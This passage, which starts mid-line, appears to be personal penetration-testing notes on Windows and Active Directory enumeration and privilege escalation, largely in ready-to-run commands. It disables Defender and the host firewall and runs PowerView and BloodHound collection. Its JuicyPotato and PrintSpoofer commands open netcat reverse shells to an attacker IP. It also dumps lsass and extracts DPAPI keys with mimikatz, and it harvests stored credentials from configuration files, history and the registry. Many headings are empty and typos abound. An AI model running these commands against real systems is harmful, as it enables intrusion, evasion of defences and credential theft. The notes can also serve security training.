	MPpreference -DisablereamtimeMonitoring $true

### Host Based Firewall
	Get-NetFirewallProfile | Format-Table Name, Enabled
	Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
	Get-NetFirewallProfile | Format-Table Name, Enabled
	Get-NetFirewallRule | select DisplayName, Enabled, Description
	Test-NetConnection -ComputerName 127.0.0.1 -Port 80
	Get-eventlog -list
### Applocker
	get-applocker policy -effective | select -expandproperty Rulecollections
	TEST IT: get-applocker policy -local | test-applockerpolicy -path C:\windows\system32\cmd.exe -user everyone

### Firewall Enumeration
	netsh advfirewall show currentprofile  
	netsh advfirewall firewall show rule name=all  
	netsh firewall show state  
	netsh firewall show config  

### Domain Enumeration
	echo %userdomain%   finds the Domain you are in.

User Enumeration:
  #### Windows:
	net user
	net user /domain
	net user [username]
	net user [username] /domain
	wmic useraccount
  #### Mac:
	dscl . ls /Users
	dscl . read /Users/[username]
	dscl "/Active Directory/TEST/All Domains" ls /Users
	dscl "/Active Directory/TEST/All Domains" read /Users/[username]
	dscacheutil -q user
 ### LDAP:
	ldapsearch -H ldap://test.local -b DC=test,DC=local "(objectclass=user)"
	ldapsearch -H ldap://test.local -b DC=test,DC=local "(&(objectclass=user)(name=[username]))"

### Computer Enumeration:
  #### Windows:
	net group "Domain Computers" /domain
	net group "Domain Controllers" /domain
 #### Mac:
	dscl "/Active Directory/TEST/All Domains" ls /Computers
	 dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"
### Group Enumeration:
  ### Windows:
	net localgroup
	net group /domain
	net localgroup [groupname]
	net group [groupname] /domain
	wmic group
  ### Mac:
	dscl . ls /Groups
	dscl . read "/Groups/[groupname]"
	dscl "/Active Directory/TEST/All Domains" ls /Groups
	dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"
### LDAP:
	ldapsearch -H ldap://test.local -b DC=test,DC=local "(objectclass=group)"
	ldapsearch -H ldap://test.local -b DC=test,DC=local "(&(objectclass=group)(name=[groupname]))"
	ldapsearch -H ldap://test.local -b DC=test,DC=local "(&(objectclass=group)(name=*admin*))"

### Domain Information:
  #### Windows:
	wmic ntdomain
	ipconfig /all
 #### Mac:
	dsconfigad -show

NEED TO ADD DOMAIN TRUST ENUMERATION ETC.
	
### PowerView overview 
- TOOL: github.com/PowerTools/PowerView at Master. Listed at deprecated but its find or search through powersploit for powerview.ps1 
<details>
  <summary>
    Take the file and run it from the machine. If we have a shell, we launch powershell in the shell and run it. 
  </summary>
  Here
</details>

#### Running it 
	Poweshell –ep bypass 
	.\powerview.ps1 
	https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 

#### Doing work 
	Get-NetDomain – tells us everything about the DC, where they arr 
	Get-NetDominController 
#### Tell you its IP address 
	Get-DomainPolicy 
	(Get-DomainPolicy)."system access" 
#### This shows password policy
	Get-NetUser 
#### Find user accounts and information, may find data in their dewscriptions 
	Get-NetUser | select cn, description 
	Get-UserProperty 
#### These are whats in the netuser section 
	Get-UserProperty –Properties pwdlastset 
	Get-UserProperty –Properties logoncount 
#### No logons could show that this is a honeypot account 
	 Get-NetComputer 
	Shows all computers 
	Get-netcomputer –fulldata 
	Get-netcomputer –fulldata |select operating system 
	Get-NetGroup –GroupName "Domain Admins". Or *admin*
	Invoke-ShareFinder.  (finds all smb shares) 
	Get-NetUserGPO | select displayname, whenchanged 

So we know whats going on and when setup 
	
### Bloodhound
<details>
  <summary>
    Summary
  </summary>
 Downloads active directory data onto a machine. It puts the data into a graph. 
</details>

#### Installing
	Apt install bloodhound 
	sudo apt-get install neo4j
	sudo systemctl stop neo4j  
	cd /usr/bin ./neo4j console  
	Edit the neo4j login
	then just type in bloodhound

#### Other aspect 
- Neo4j console 
- Need to change our default credentials 
- How to connect by web browser should show here 
- Logins 
- Neo4j 
- Neo4j 

#### Load bloodhound 
- Green checkmark means we connected to the neo4j database 
- We get the site just type in Bloodhound into the command line


#### Gragging data with invoke bloodhound 
- Download an ingested  bloodhoundAD/Invoke-bloodhound 
#### The sharkhound is good too These should all be installed on the target machine 
	Powershell –ep bypass 
	.\sharkhound.ps1 
	Invoke-blodhound –collectionmethod All –Domain DOMAIN –ZipFileName Evidence.zip 
	Now copy this zip data and open 

#### Enumerating domain data with bloodhound 
	Upload the data to the bloodhound system 
	This will start showing you all of bloodhound 
	They have prebuilt queries for identifying information
	
## Windows Priv Escalation

ATTACKING
Local Machine Priv Esc Methods


Attack Summary

Impersonation/Potato Attacks
Printspoofer
Abusing Token Privileges
Windows linux subsystem
SMBGhost CVE-2020-0796
CVE-2021-36934 HiveNightmare/SeriousSAM
Unattend Answer Files
Kernel Exploits
Applications and Driver Exploits
DLL Injection
Insecure File or Folder Permissions
GPP
Unquoted Service Path
Always Install Elevated
Insecure Service Permissions
DLL Hijacking
Insecure Registry Permissions
Token Manipulation
Autologon User Credentials
Autoruns
Insecure Names Pipes Permissions
Unattended Windows Installation
Powershell History
IIS Config
ADD INVEIGH


Abusing windows group priveleges
Traffic Capture
Windows User privileges




Tools
Metasploit -incognito
Metasploit - Psexec
Bloodhound
Powersploit
dpapi
seatbelt - Local priv esclation shecks
WinPEAS - loks for priv esc
PowerUP - powershell script for finding priv esc
SharUP - other version of Powerup
JAWS - enumeration priv esc with powershell
Sessiongopher - powershell tool to find saved session info for remote tools
Watson - enumerates and looks for priv esc
LaZagne - retrieves passwords from web browser, chat tools, dataabases etc
WES-NG - windows exploit check either in meterpreter or as an exe
Sysinternals -pipelist

URL File Attack

-----------------------------------------------------------------------------------------------------------------------------------------------------
Impersonation/Potato Attacks
Describe
ONLY WORKS ON Server 2016 and Windows 10 Patch 1803 or lower
When users login to the machine, tokens are generated and stored until the PC resets. We want to to impersonate this token


Token Manipulation (if you have a shell in meterpreter
.\incognito.exe list_tokens -u 
,\incognito.exe execute -c "domain\users"
impersonatre_token <domain\\user>

Juicy potato: https://github.com/ohpe/juicy-potato'
- This means the whoami /priv should show the user can run SeImpersonate
juicypotato.exe 
Run sudo nc -lnvp 8444  on your machine
TARGET: juicypotato.exe -l 533375 -p C;\windows\system32\cmd.exe -a /c C:\tools\nc.exe 10.10.14.3 8444 -e cmd.exe -t *


Lovely Potato: https://github.com/TsukiCTF/Lovely-Potato 

RoguePotato: https://github.com/antonioCoco/RoguePotato		
This works on server 2019

Abusing Token Privileges (SeDebug)
Two attacks
Password grab
We can use sysinternals procdump to dump lsass. procdump.exe -accepteula -ma lsass.exe lsass.dmp
Then download it and attack with mimikatz
RCE
Launching a child process to alter system behavior to inherit the token of a parent process and impersonate it.
Use this PoC: https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
Load it into powershell and run: psgetsys.ps1;  [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")  
Now open powershell as the user, type tasklist, here they target winlogon.exe because it runs as system.
run psgetsys,ps1; {myprocess]:CreateProcessFromParent((Get-process "lsass").Id,"C:windows\system21\cmd.exe","")
SeTakeOwnershipPrivilege
If not enable, attempt to use it https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
import-module .\enable-privilege.ps1
Next choose a target file
C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
Check file ownership
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'
Own it
takeown /f 'C:\Department Shares\Private\IT\cred.txt'  
May need to ICACLS it
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

-----------------------------------------------------------------------------------------------------------------------------------------------------
Printspoofer
This works like the rogue potato, the SeImpersonate must be enabled.
TARGET: c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"  
My machine: run netcat

-----------------------------------------------------------------------------------------------------------------------------------------------------
Windows linux subsystem

-----------------------------------------------------------------------------------------------------------------------------------------------------
SMBGhost CVE-2020-0796
Describe: This affects Windows 10 Version 1903 and 1909
https://blog.zecops.com/research/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/

ATTACK: https://github.com/ZecOps/CVE-2020-0796-LPE-POC

-----------------------------------------------------------------------------------------------------------------------------------------------------
CVE-2021-36934 HiveNightmare/SeriousSAM


-----------------------------------------------------------------------------------------------------------------------------------------------------
Unattend Answer Files

-----------------------------------------------------------------------------------------------------------------------------------------------------
Kernel Exploits
-----------------------------------------------------------------------------------------------------------------------------------------------------
Applications and Driver Exploits
-----------------------------------------------------------------------------------------------------------------------------------------------------
DLL Injection
-----------------------------------------------------------------------------------------------------------------------------------------------------
Insecure File or Folder Permissions
-----------------------------------------------------------------------------------------------------------------------------------------------------
GPP
-----------------------------------------------------------------------------------------------------------------------------------------------------
Unquoted Service Path
-----------------------------------------------------------------------------------------------------------------------------------------------------
Always Install Elevated
-----------------------------------------------------------------------------------------------------------------------------------------------------
Insecure Service Permissions
-----------------------------------------------------------------------------------------------------------------------------------------------------
DLL Hijacking
-----------------------------------------------------------------------------------------------------------------------------------------------------
Insecure Registry Permissions
-----------------------------------------------------------------------------------------------------------------------------------------------------
Token Manipulation
-----------------------------------------------------------------------------------------------------------------------------------------------------
Autologon User Credentials
-----------------------------------------------------------------------------------------------------------------------------------------------------
Autoruns
-----------------------------------------------------------------------------------------------------------------------------------------------------
Passwords Registry
-----------------------------------------------------------------------------------------------------------------------------------------------------
UAC Bypass
-----------------------------------------------------------------------------------------------------------------------------------------------------
Insecure Names Pipes Permissions
Pipes is how processes communicate to each other, cobalt strike uses names popes for every command.
1. Beacon starts a pipe
2. Beacon starts a process
3. Server dispalys what was done

Two types of pipes
Named Pipes and Anonymous Pipes:  communicate in half duplex or duplex one way with client being able to write data over the pipe and the server responds back with data
We can use pipelist.exe from sysinternals to review these OR powershell gci \\.\pipe\\
THEN use sysinternals Accesschk to enumerate permissions assigned to pipes. accesschk.exe /accepteula \pipe\

EXAMPLE: if we find a pipe with read write, then we can attack it. first verify accesschk.exe -accepteula -w \pipe\SERVICE -v
HOW???
-----------------------------------------------------------------------------------------------------------------------------------------------------
Unattended Windows Installation
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

-----------------------------------------------------------------------------------------------------------------------------------------------------

Powershell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  

-----------------------------------------------------------------------------------------------------------------------------------------------------
IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
Here is a quick way to find database connection strings on the file:

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
-----------------------------------------------------------------------------------------------------------------------------------------------------
PUTTY Credentials

Credentials from Putty if installed
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s  

-----------------------------------------------------------------------------------------------------------------------------------------------------
dpapi extract
dpapi::cred
dpapi::cred /in:C\path\to\encrypted\file /masterkey:<masterkey>

The DPAPI keys are stored under %APPDATA%\Microsoft\Protect\{SID}
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>  


With users password- mimikatz
• dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected  

Without users password- mimikatz
• dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc  

with local administrator
• sekurlsa::dpapi  

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords
Common CVE's
2019-1388

-----------------------------------------------------------------------------------------------------------------------------------------------------
Autologin
Verify enabled:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
reg query "HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon" /v LastUsedUsername  


Getsystem
RunAS
Registry reviews - AlwasysInstallAsElevated, Autorun, regsvc ACL, regsvc escalation, exe escalation
DLL hijacking

Service permissions
Common CVEs - printspooler, hive nightmware, heartbleed, 
- Unquoted paths
- Version exploits
- configuration issues
- powershell transcriptions
- krbrelayup
- AlwaysInstallElevated
- PowerUP
- MSI Wrapper
- Wdigest
- LSA
- Credential Guard
	
## Elevated Privileges
## Domain Administrator
